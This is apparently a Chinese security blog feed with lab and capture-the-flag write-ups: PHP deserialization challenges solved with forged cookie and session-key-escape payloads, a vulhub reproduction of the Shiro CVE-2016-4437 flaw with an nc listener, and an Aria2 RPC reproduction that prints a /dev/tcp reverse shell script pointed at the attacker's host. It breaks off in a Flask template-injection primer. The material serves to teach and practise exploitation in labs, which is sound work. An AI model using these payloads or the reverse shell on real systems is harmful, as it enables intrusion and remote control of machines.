class="number">21</span>;&#125;</span><br><span class="line">User <span class="keyword">Object</span> ( [name] =&gt; Mamor [age] =&gt; <span class="number">21</span> )</span><br></pre></td></tr></table></figure>

<p><code>a:3:&#123;i:0;s:3:&quot;Dog&quot;;i:1;s:3:&quot;Cat&quot;;i:2;s:4:&quot;Zard&quot;;&#125;</code></p>
<p><code>对象类型:长度:&#123;长度:类型:值,长度:类型:值,长度:类型:值&#125;</code></p>
<p><code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;</code></p>
<p><code>对象类型:长度:类名：类中变量个数:&#123;类型：长度：值，类型：长度：值，类型：长度：值&#125;</code><br><br></p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p><a href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解</a></p>
<blockquote>
<p>__construct()    当一个对象创建时被调用<br>__destruct()        当一个对象销毁时被调用<br>__toString()        当反序列化后的对象被输出的时候(转化为字符串的时候)被调用<br>__sleep()             在对象在被序列化之前被调用<br>__wakeup            在序列化之后立即被调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;aaaaa&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;bbbbb&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __construct&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __destruct()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__wakeup()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__sleep()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">// 创建对象时会调用 __construct()</span></span><br><span class="line">	<span class="variable">$obj</span> = <span class="keyword">new</span> test();  </span><br><span class="line"></span><br><span class="line">	<span class="variable">$serialize</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;serialize: &#x27;</span> .<span class="variable">$serialize</span>. <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$unserialize</span> = unserialize(<span class="variable">$serialize</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$obj</span>-&gt;aaa();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对象销毁时会调用 __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line">__construct</span><br><span class="line">__sleep()</span><br><span class="line">serialize: N;</span><br><span class="line">aaaaa</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure>

<br>

<h3 id="zkaq靶场题目"><a href="#zkaq靶场题目" class="headerlink" title="zkaq靶场题目"></a>zkaq靶场题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag in ./flag.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">readme</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="string">&#x27;Readme.txt&#x27;</span>, <span class="literal">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> readme();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;  <span class="comment">//这里存在可控参数，可以尝试构造序列化对象flag.php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$todos = [];</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = substr(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="variable">$m</span> = substr(<span class="variable">$c</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = unserialize(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$c=$h+$m=md5(m)+$m</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = serialize(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = md5(<span class="variable">$m</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Readme&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;?source&quot;</span>&gt;&lt;h2&gt;Check Code&lt;/h2&gt;&lt;/a&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(<span class="variable">$todos</span> <span class="keyword">as</span> <span class="variable">$todo</span>):<span class="meta">?&gt;</span></span><br><span class="line">    &lt;li&gt;<span class="meta">&lt;?=</span><span class="variable">$todo</span><span class="meta">?&gt;</span>&lt;/li&gt;           <span class="comment">//  &lt;=== <span class="meta">&lt;?php</span> echo $todo <span class="meta">?&gt;</span>的简写</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> href=<span class="string">&quot;.&quot;</span>&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;text&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;store&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">readme</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> highlight_file(<span class="string">&#x27;readme.txt&#x27;</span>,<span class="literal">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> readme();</span><br><span class="line"><span class="variable">$s</span> -&gt;source = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = [<span class="variable">$s</span>];</span><br><span class="line"><span class="keyword">echo</span> md5(serialize(<span class="variable">$s</span>)).serialize(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到<code>e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</code>先进行一次url编码然后使用cookie传参</p>
<p><code>todos=e2d4f7dcc43ee1db7f69e76303d0105ca%3A1%3A%7Bi%3A0%3BO%3A6%3A%22readme%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</code>最终得到<code>zkz&#123;UNs_what_what?&#125;</code></p>
<br>

<h3 id="安洵杯-2019-easy-serialize-php1"><a href="#安洵杯-2019-easy-serialize-php1" class="headerlink" title="[安洵杯 2019]easy_serialize_php1"></a>[安洵杯 2019]easy_serialize_php1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 $function = phpinfo 会得到phpinfo页面，得到了flag文件名为 d0g3_f1ag.php    ，想办法去读取flag文件去得到flag</p>
<p>后面的wp看了下师傅们的wp，使用的字符逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$str1</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;含有垃圾参数的:&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;aaa垃圾参数w(ﾟДﾟ)w&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str2</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125;</span><br><span class="line">含有垃圾参数的:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125; </span><br></pre></td></tr></table></figure>

<p>可以看到就算是有垃圾参数，在进行反序列化的时候也不会出现，不会影响反序列化正常运行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br></pre></td></tr></table></figure>

<p>清空$_SESSION变量值，并重新赋值</p>
<p><code>extract($_POST);</code>对post传参进行了变量覆盖</p>
<p>后续可以只看这些代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在filter()函数中过滤掉了php,flag,php5,php4,fl1g</p>
<p>file_get_contents()函数可以将整个文件读入一个字符串， 让base64编码的值为flag的所在文件名 ，</p>
<p>即d0g3_f1ag.php–&gt;base64编码后为 <code>ZDBnM19mMWFnLnBocA==</code>(20位) 反序列化后为 <code>s:3:&quot;img&quot;,s:20,&quot;ZDBnM19mMWFnLnBocA==&quot;</code></p>
<p>看了下Leena_c9a7师傅的wp，当后台如果存在过滤的话 $_SESSION数组的键值会发生变化，既然无法去控制img的值，就可以利用这道题目本身的过滤器，</p>
<p><code>post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>是预期输出的序列化字符</p>
<p><img src="/posts/7c19cc12/1.PNG"></p>
<p>经过filter过滤玩之后 flagflag会替换为空</p>
<p><code>a:2:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>变为</p>
<p><code>a:2:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
<p><code>s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;</code> 这样这里的s:8的值为<code>&quot;;s:51:&quot;</code></p>
<p>a:2:{s:8:”<em><strong>“;s:51:”</strong></em>“;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
<p>这样两对键值为 <code>&quot;;s:51:&quot;</code> <code>aaa</code>   和 <code>img</code> <code>ZDBnM19mMWFnLnBocA==</code> }后面的内容</p>
<p><code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>均会当作垃圾参数忽略掉</p>
<p><img src="/posts/7c19cc12/2.PNG"></p>
<p>这样 file_get_contents()读取<code>d0g3_f1ag.php</code>的内容</p>
<p><strong>payload</strong></p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
</blockquote>
<p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>base64(d0g3_fllllllag) = L2QwZzNfZmxsbGxsbGFn</p>
<p>payload</p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}    </p>
</blockquote>
<p>得到flag<code>flag&#123;7d55f960-c93d-4db0-8524-f51d073ce4db&#125;</code></p>
<p><img src="/posts/7c19cc12/3.PNG"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<p><a href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
<p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro反序列化复现</title>
    <url>/posts/135e71ec/</url>
    <content><![CDATA[<h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><blockquote>
<p>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）<br>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
</blockquote>
<p>shiro 提供了RememberMe功能，对rememberMe的cookie做了加密处理，当用户成功登录后shiro在CookieRememberMeManaer类中将cookie中rememberMe字段内容分别进行 <strong>序列化，AES加密，base64编码。</strong></p>
<p>相对的，在识别身份是会对cookie的RememberMe字段进行解密处理，解密顺序为    <strong>获取RememberMe cookie ，base64解密， AES解密， 反序列化</strong></p>
<p>所以可以构造一个恶意对象，对其序列化，AES加密，base64编码之后作为cookie的RememberMe 字段发送出去，shiro会将RememberMe进行解密并反序列化，从而造成反序列化漏洞.</p>
<br>

<br>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>kali : 192.168.87.128</p>
<p>Ubuntu : 192.168.87.129</p>
<p><code>docker-compose up -d</code> 访问<code>192.168.87.129:8080</code></p>
<p>使用burpsuite抓包，勾选rememberme,账号密码分别为<code>admin</code>,<code>vulhub</code></p>
<p><img src="/posts/135e71ec/bp1.png"></p>
<p>提交表单后,可以看到set-cookie的remeberMe=deleteMe</p>
<br>

<p><img src="/posts/135e71ec/1.PNG"></p>
<p><img src="/posts/135e71ec/2.PNG"></p>
<p>在kali上开启监听 </p>
<p><code>nc -lvvp 6666</code></p>
<p><img src="/posts/135e71ec/3.PNG"></p>
<p><img src="/posts/135e71ec/4.PNG"></p>
<p><img src="/posts/135e71ec/shell.png"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2RCE漏洞复现</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><p>Aria2 是一款命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>docker-compose up -d</code></p>
<p>aria2的rpc服务端口默认为6800，启动环境后访问 <code>192.168.159.128:6800</code> burpsuite抓包后发现返回为404</p>
<p>因为 rpc 通信需要使用 json 或者 xml，不太方便，所以我们可以借助第三方 UI 来和目标通信，这是一款轻量级web写入工具</p>
<p><code>http://binux.github.io/yaaw/demo/</code></p>
<p>点击右上角的设置进行信息配置</p>
<p><img src="/posts/undefined/settings.png"></p>
<br>

<p>开启一个web服务，将shell准备好，shell文件要在linux环境下去生产，因为Linux和windows下的换行符不同</p>
<p>kali ： 192.168.159.129</p>
<p>Ubuntu ： 192.168.159.128</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line">/bin/sh <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">159.129</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python2 ：python2 -m SimpleHTTPServer 8000<br>Python3 ：python3 -m http.server 8000</p>
<p><img src="/posts/undefined/add_task.png"></p>
<p>不知道为什么，无法下载文件，之前去测试下载别的东西，也无法去下载…一直报错<code>Error: Internal server error</code></p>
<p>查了下报错原因 说是因为没有找到 Aria2 进程，但是在vulhub docker环境中已经开放了，试了几次最终还是没找到原因….后续的利用crond任务反弹shell也就没法实现了。<br>之后有时间再去复现一下吧.</p>
]]></content>
      <categories>
        <category>Aria2</category>
      </categories>
      <tags>
        <tag>Aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask_ssti</title>
    <url>/posts/83c81c44/</url>
    <content><![CDATA[<h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>ssti 服务端模板注入，多存在于python的jinja2,django,tornado,mako 框架  php的tiwg,smarty框架 java框架jade velocity</p>
<p>在不正确使用模板引擎进行渲染时，会造成模板注入，会造成RCE，任意文件读取等漏洞，多出现再ctf中.</p>
<p><img src="/posts/83c81c44/ssti.png"></p>
<br>

<hr>
<h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><ul>
<li><p><code>__class__</code>         返回该对象所属的类</p>
<p>   <img src="/posts/83c81c44/1.png"></p>
</li>
<li><p><code>__base__</code>        以字符串形式返回一个类所直接继承的第一个类</p>
</li>
<li><p><code>__bases__</code>        以元组的形式返回一个类所直接继承的类</p>
</li>
<li><p><code>__mro__</code>            返回解析方法调用的顺序</p>
<p>  <img src="/posts/83c81c44/2.png"></p>
</li>
<li><p><code>__subclasses__()</code>        返回这个类的所有子类的集合</p>
<p>  <img src="/posts/83c81c44/3.png"></p>
</li>
<li><p><code>__globals__</code>    <code>function.__global__</code>  获取function所处空间下可以使用的module、方法及所有变量</p>
</li>
